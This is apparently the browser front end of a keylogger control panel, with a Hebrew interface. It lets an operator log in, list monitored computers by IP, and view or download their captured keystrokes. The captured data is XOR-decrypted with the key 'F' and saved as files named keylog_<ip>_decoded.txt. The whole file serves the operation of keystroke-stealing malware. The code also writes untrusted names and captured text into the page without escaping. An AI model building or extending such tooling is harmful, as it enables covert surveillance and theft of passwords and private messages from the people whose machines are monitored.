const API_URL = 'http://localhost:5000/api';

let computers = [];

document.addEventListener('DOMContentLoaded', () => {
    
    const loginForm = document.getElementById('login-form');
    const loginPage = document.getElementById('login-page');
    const dashboardPage = document.getElementById('dashboard-page');
    const userNameElement = document.getElementById('user-name');
    const searchInput = document.getElementById('search-input');
    
    const username = localStorage.getItem('username');
    if (username) {
        loginPage.style.display = 'none';
        dashboardPage.style.display = 'block';
        userNameElement.innerText = username;
        updateComputersList();
    }

    if (loginForm) {
        loginForm.addEventListener('submit', async (event) => {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
        
            try {
                const response = await fetch(`${API_URL}/login`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        username,
                        password
                    })
                });
                const data = await response.json();
                if (data.success) {
                    localStorage.setItem('username', data.username);
                    loginPage.style.display = 'none';
                    dashboardPage.style.display = 'block';
                    userNameElement.innerText = data.username;
                    updateComputersList();
                } else {
                    alert("שם משתמש או סיסמה שגויים");
                }
            } catch (error) {
                console.error("שגיאת התחברות", error);
                alert("שגיאת התחברות");
            }
        });
    }

    if (searchInput) {
        searchInput.addEventListener('input', searchComputers);
        
    }
});

function showAddComputerForm() {
    const form = document.getElementById('add-computer-form');
    form.style.display = form.style.display === 'none' ? 'block' : 'none';
}

async function addComputer() {
    const name = document.getElementById('name').value;
    const ip = document.getElementById('ip').value;
    
    if (!name || !ip) {
        alert("נא למלא את כל השדות");
        return;
    }
    
    try {
        const response = await fetch(`${API_URL}/computers`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                name,
                ip
            })
        });

        const data = await response.json();
        if (!response.ok) {
            alert(data.message || "שגיאה בהוספת מחשב");
            return;
        }
        
        document.getElementById('add-computer-form').style.display = 'none';
        document.getElementById('name').value = '';
        document.getElementById('ip').value = '';
        
        updateComputersList();
        
    } catch (error) {
        console.error("שגיאה בהוספת מחשב", error);
        alert("שגיאה בהוספת מחשב");
    }
}

async function removeComputer(ip) {
    if (!confirm("האם אתה בטוח שברצונך למחוק את המחשב?")) {
        return;
    }
    
    try {
        const response = await fetch(`${API_URL}/computers/${ip}`, {
            method: 'DELETE'
        });

        if (!response.ok) {
            alert("שגיאה במחיקת מחשב");
            return;
        }
        
        await response.json();
        updateComputersList();
        
    } catch (error) {
        console.error("שגיאה במחיקת מחשב", error);
        alert("שגיאה במחיקת מחשב");
    }
}

async function updateComputersList() {
    try {
        let response = await fetch(`${API_URL}/computers`);
        if (!response.ok) {
            throw new Error('שגיאה בטעינת רשימת מחשבים');
        }
        computers = await response.json();
        renderComputersList(computers);
    } catch (error) {
        console.error("שגיאה בטעינת רשימת מחשבים:", error);
        alert("שגיאה בטעינת רשימת מחשבים");
    }
}

function renderComputersList(computersList) {
    const tableBody = document.getElementById('computers-list');
    if (!tableBody) return;
    
    tableBody.innerHTML = '';

    computersList.forEach(computer => {
        const hasData = computer.data !== false;

        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${computer.name}</td>
            <td>${computer.ip}</td>
            <td>${computer.status || 'offline'}</td>
            <td>${computer.lastActivity || 'לא ידוע'}</td>
            <td>
                <button onclick="removeComputer('${computer.ip}')">מחק</button>
                <button onclick="showMonitoring('${computer.ip}')">מעקב</button>
                <button onclick="showListeningData('${computer.ip}')" ${!hasData ? 'disabled' : ''}>צפה בהאזנות</button>
            </td>
        `;
        tableBody.appendChild(tr);
    });
}



document.addEventListener('DOMContentLoaded', () => {
    
});

async function showMonitoring(ip) {
    try {
        const response = await fetch(`${API_URL}/computers/${ip}`);
        if (!response.ok) {
            throw new Error('שגיאה בטעינת פרטי מחשב');
        }
        
        const computer = await response.json();
        
        const dashboardContent = document.getElementById('dashboard-content');
        dashboardContent.innerHTML = `
            <h2 class="content-title">פרטי מחשב: ${computer.name}</h2>
            <div class="computer-details">
                <div class="details-container">
                    <p><strong>IP:</strong> ${computer.ip}</p>
                    <p><strong>סטטוס:</strong> ${computer.status || 'offline'}</p>
                    <p><strong>פעילות אחרונה:</strong> ${computer.lastActivity || 'לא ידוע'}</p>
                    <p><strong>נתוני האזנה:</strong> ${computer.data ? 'זמינים' : 'לא זמינים'}</p>
                    ${computer.data ? `<p><strong>עדכון אחרון:</strong> ${computer.last_modified}</p>` : ''}
                </div>
                
                <div class="actions-container">
                    <button onclick="showPage('dashboard')">חזרה לרשימה</button>
                    ${computer.data ? 
                        `<button onclick="showListeningData('${computer.ip}')">צפה בנתוני האזנה</button>
                        <button onclick="downloadListeningData('${computer.ip}')">הורד קובץ האזנה</button>` : 
                        ''}
                </div>
            </div>
        `;
    } catch (error) {
        console.error("שגיאה בטעינת פרטי מחשב", error);
        alert("שגיאה בטעינת פרטי מחשב");
    }
}

async function showListeningData(ip) {
    try {
        const response = await fetch(`${API_URL}/listening/${ip}`);
        if (!response.ok) {
            throw new Error('שגיאה בטעינת נתוני האזנה');
        }
        
        const data = await response.json();
        console.log("Listening data:", data);
        
        const computer = computers.find(computer => computer.ip === ip);
        const computerName = computer ? computer.name : 'לא ידוע';

        const dashboardContent = document.getElementById('dashboard-content');
        
        let contentHTML = '<div class="listening-records">';
        
        if (Object.keys(data).length === 0) {
            contentHTML += '<div class="empty-data">אין נתוני האזנה זמינים</div>';
        } else if (Array.isArray(data)) {
            for (const record of data) {
                contentHTML += formatListeningRecord(record);
            }
        } else {
            for (const timestamp in data) {
                contentHTML += `<div class="timestamp-header">${timestamp}</div>`;
                contentHTML += formatListeningRecord(data[timestamp]);
            }
        }
        
        contentHTML += '</div>';

        dashboardContent.innerHTML = `
            <h2 class="content-title">נתוני האזנה של מחשב: ${computerName}</h2>
            <div class="listening-data">
                <div class="data-actions">
                    <button onclick="showPage('dashboard')">חזרה לרשימה</button>
                    <button onclick="showMonitoring('${ip}')">חזרה לפרטי מחשב</button>
                    <button onclick="downloadDecodedData('${ip}')">הורד נתונים מפוענחים</button>
                </div>
                <div class="data-content">
                    ${contentHTML}
                </div>
            </div>
        `;

    } catch (error) {
        console.error("שגיאה בטעינת נתוני האזנה:", error);
        alert("שגיאה בטעינת נתוני האזנה");
    }
}

function formatListeningRecord(record) {
    let recordHTML = '<div class="record-content">';
    
    if (Array.isArray(record)) {
        const decrypted = record.map(char => decryptData(char)).join('');
        recordHTML += `<div class="record-text">${decrypted}</div>`;
    } else if (typeof record === 'object') {
        for (const key in record) {
            if (Array.isArray(record[key])) {
                const decrypted = record[key].map(char => decryptData(char)).join('');
                recordHTML += `<div class="record-entry"><span class="timestamp">${key}:</span> ${decrypted}</div>`;
            } else {
                recordHTML += `<div class="record-entry"><span class="timestamp">${key}:</span> ${record[key]}</div>`;
            }
        }
    } else {
        recordHTML += `<div class="record-text">${record}</div>`;
    }
    
    recordHTML += '</div>';
    return recordHTML;
}

function decryptData(encryptedData, key = "F") {
    if (!encryptedData) return '';
    
    let decrypted = '';
    for(let i = 0; i < encryptedData.length; i++) {
        const charCode = encryptedData.charCodeAt(i) ^ key.charCodeAt(0);
        decrypted += String.fromCharCode(charCode % 256);
    }
    return decrypted;
}

async function downloadDecodedData(ip) {
    try {
        const response = await fetch(`${API_URL}/listening/${ip}`);
        if (!response.ok) {
            throw new Error('שגיאה בטעינת נתוני האזנה');
        }
        
        const data = await response.json();
        
        let decodedText = '';
        
        if (Array.isArray(data)) {
            for (const record of data) {
                decodedText += processRecordForDownload(record) + '\n\n';
            }
        } else {
            for (const timestamp in data) {
                decodedText += `=== ${timestamp} ===\n`;
                decodedText += processRecordForDownload(data[timestamp]) + '\n\n';
            }
        }
        
        const blob = new Blob([decodedText], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `keylog_${ip}_decoded.txt`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    } catch (error) {
        console.error("שגיאה בהורדת נתונים:", error);
        alert("שגיאה בהורדת נתונים");
    }
}

async function downloadListeningData(ip) {
    try {
        const response = await fetch(`${API_URL}/listening/${ip}`);
        if (!response.ok) {
            throw new Error('שגיאה בטעינת נתוני האזנה');
        }
        
        const data = await response.json();
        const jsonString = JSON.stringify(data, null, 2);
        
        const blob = new Blob([jsonString], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `keylog_${ip}_raw.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    } catch (error) {
        console.error("שגיאה בהורדת נתונים:", error);
        alert("שגיאה בהורדת נתונים גולמיים");
    }
}

function processRecordForDownload(record) {
    if (Array.isArray(record)) {
        return record.map(char => decryptData(char)).join('');
    } else if (typeof record === 'object') {
        let text = '';
        for (const key in record) {
            if (Array.isArray(record[key])) {
                text += `${key}: ${record[key].map(char => decryptData(char)).join('')}\n`;
            } else {
                text += `${key}: ${record[key]}\n`;
            }
        }
        return text;
    } else {
        return String(record);
    }
}

function searchComputers() {
    const searchValue = document.getElementById('search-input').value.toLowerCase();
    const filteredComputers = computers.filter(computer => {
        return computer.name.toLowerCase().includes(searchValue) || 
               computer.ip.toLowerCase().includes(searchValue);
    });

    renderComputersList(filteredComputers);
}

function showPage(pageName) {
    const dashboardContent = document.getElementById('dashboard-content');
    
    switch(pageName) {
        case 'dashboard':
            dashboardContent.innerHTML = `
                <h2 class="content-title">לוח בקרה</h2>
                <div id="search">
                    <input type="search" id="search-input" placeholder="חפש מחשב...">
                    <button id="refresh-button" onclick="updateComputersList()">רענן רשימה</button>
                </div>
                <table class="computers">
                    <thead>
                        <tr>
                            <th>שם מחשב</th>
                            <th>IP</th>
                            <th>סטטוס</th>
                            <th>פעילות אחרונה</th>
                            <th>פעולות</th>
                        </tr>
                    </thead>
                    <tbody id="computers-list"></tbody>
                </table>
            `;
            updateComputersList();
            
            const searchInput = document.getElementById('search-input');
            if (searchInput) {
                searchInput.addEventListener('input', searchComputers);
            }
            break;
        case 'users':
            dashboardContent.innerHTML = '<h2 class="content-title">ניהול משתמשים</h2><p>פונקציונליות זו עדיין בפיתוח</p>';
            break;
        default:
            updateComputersList();
    }
}

function logout() {
    localStorage.removeItem('username');
    const loginPage = document.getElementById('login-page');
    const dashboardPage = document.getElementById('dashboard-page');
    
    if (loginPage && dashboardPage) {
        loginPage.style.display = 'block';
        dashboardPage.style.display = 'none';
        
        const usernameField = document.getElementById('username');
        const passwordField = document.getElementById('password');
        if (usernameField) usernameField.value = '';
        if (passwordField) passwordField.value = '';
    } else {
        console.error("Cannot find login or dashboard elements");
        window.location.href = window.location.pathname;
    }
}